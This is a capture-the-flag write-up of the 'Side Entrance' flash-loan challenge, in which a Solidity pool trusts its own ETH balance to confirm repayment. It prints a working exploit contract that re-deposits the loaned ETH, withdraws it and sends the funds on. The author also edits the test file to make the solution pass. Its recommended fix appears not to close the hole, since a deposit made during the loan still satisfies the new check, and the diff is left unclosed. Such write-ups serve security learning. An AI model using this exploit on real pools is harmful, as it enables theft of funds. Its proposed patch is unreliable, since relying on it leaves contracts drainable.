# Side Entrance

**As Always please try the challenge yourself first! Use your creativity, AI tools, YouTube tutorials on the topic, whatever it takes to try and solve it!** 

## Challenge Description:

```
A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time.

It has 1000 ETH in balance already, and is offering free flashloans using the deposited ETH to promote their system.

You start with 1 ETH in balance. Pass the challenge by rescuing all ETH from the pool and depositing it in the designated recovery account.
```

## Vulnerability Description
This bug lies with the way the protocol checks the way their flash loan went. The nature of using `balanceOf`/`address(contract).balance` can be prone to manipulation. We saw in earlier challenges that an attacker can simply perform a donation attack, and rendering the protocol unusable (Denial of Service), but here it is a little different. 
 
## How does this challenge display this vulnerability/ies?
Lets walk through the code quickly as it is a very simple contract:

### deposit()
```javascript
function deposit() external payable {
    unchecked {
        balances[msg.sender] += msg.value;
        }
        emit Deposit(msg.sender, msg.value);
    }
```
- A user will pass the value they want to deposit.
- It gets added to the mapping for internal accounting.
- An event will be emitted

### withdraw()
```javascript
function withdraw() external {
        uint256 amount = balances[msg.sender];

        delete balances[msg.sender];
        emit Withdraw(msg.sender, amount);

        SafeTransferLib.safeTransferETH(msg.sender, amount);
    }
```
- We get the amount from the mapping.
- Deleting the info.
- emit an event
- Transfer to the `msg.sender`.

### flashLoan()
```javascript
function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        if (address(this).balance < balanceBefore) {
            revert RepayFailed();
        }
    }
```
- User sends amount (has to be a valid receiver):
```javascript
interface IFlashLoanEtherReceiver {
    function execute() external payable;
}
```
- The function will now send the amount to the user for the loan.
- Immediately after it will check that the amount returned. It will revert if it had not.

-----

At first it seems fairly innocent. But the bug is always there. The problem here is that, if as a receiver, I call deposit with the exact amount that exists in the pool, the balance of the pool, comes back to how it was before the loan. However, now it is in my name, which lets me withdraw it with no problems!

## Challenge Solution
Here is the PoC:
```javascript
function test_sideEntrance() public {
        Receiver receiver = new Receiver(address(pool), recovery);
        vm.startPrank(address(receiver));
        pool.flashLoan(ETHER_IN_POOL);
        pool.withdraw();
    }

contract Receiver is IFlashLoanEtherReceiver {
    address public pool;
    uint256 constant ETHER_IN_POOL = 1000e18;
    address recovery;

    constructor(address _pool, address _recovery) {
        pool = _pool;
        recovery = _recovery;
    }

    function execute() external payable override {
        // Deposit the flash loaned ETH into our own balance
        (bool success,) = pool.call{value: ETHER_IN_POOL}(abi.encodeWithSignature("deposit()"));
        require(success, "Deposit failed");
    }

    fallback() external payable {
        (bool success,) = recovery.call{value: ETHER_IN_POOL}("");
        require(success, "transfer failed");
    }

    receive() external payable {
        (bool success,) = recovery.call{value: ETHER_IN_POOL}("");
        require(success, "transfer failed");
    }
}
```

I noticed the bug fairly quickly but had trouble figuring out how to do it as the pranked `player`. However, after a few tries, I realized that it did not say `DO NOT TOUCH` above the modifier like it does on the other functions in the test files, so I decided to comment it out. 

1. I wrote a `Receiver` contract that inherits the `IFlashLoanEtherReceiver` interface.
2. I get all the necessary information for the addresses I need.
3. In the test function I create a new instance of the contract, `prank` as the `receiver`, and call `flashLoan`.
4. the`flashLoan` function will trigger the `execute` function in my `Receiver` contract.
5. The `execute` function will call `deposit()` with the amount I borrowed (the full amount in the `pool`). And the flashloan still passes.
6. Now the funds are mine! I can call `withdraw` (back in the test function).
7. The `withdraw` function transfers the `Receiver` contract the amount, by using the `fallback/receive` functions.
8. They both contain a transfer call to the `recovery` account.
9. All funds stolen!

## Recommendations
To fix this bug the protocol can consider having more sophisticated internal accounting. Consider having a `totalAmount` for the total amount in the pool, which increases when users deposit, and decreases as user withdraws. When a flashloan occurs, simply check with the state variable that it matches!

```diff
contract SideEntranceLenderPool {
    mapping(address => uint256) public balances;
+   uint256 public totalAmount; 

    error RepayFailed();

    event Deposit(address indexed who, uint256 amount);
    event Withdraw(address indexed who, uint256 amount);

    function deposit() external payable {
        unchecked {
            balances[msg.sender] += msg.value;
+           totalAmount += msg.value;
        }
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];

        delete balances[msg.sender];
+       totalAmount -= amount;
        emit Withdraw(msg.sender, amount);

        SafeTransferLib.safeTransferETH(msg.sender, amount);
    }

    function flashLoan(uint256 amount) external {
-       uint256 balanceBefore = address(this).balance;
+       uint256 balanceBefore = totalAmount;

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        if (address(this).balance < balanceBefore) {
            revert RepayFailed();
        }
    }
```